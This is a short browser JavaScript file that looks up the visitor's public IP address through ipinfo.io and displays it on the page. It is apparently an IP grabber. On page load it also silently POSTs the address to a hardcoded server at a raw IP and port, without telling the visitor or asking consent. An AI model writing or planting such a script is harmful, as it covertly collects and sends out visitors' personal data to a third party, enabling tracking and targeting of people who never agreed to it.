const label = document.getElementById("e")

async function GetIp() {
    var url = "https://ipinfo.io/json"
    var res = await fetch(url)
    var json = await res.json()
    var ip = json.ip
    return ip
}

async function SendToEndpoint(ip) {
    var endpoint = "http://87.106.44.40:6060"
    await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          "ip": ip
        })
    })
}

async function main() {
    var ip = await GetIp()
    SendToEndpoint(ip)
    label.textContent = ip
}

main()
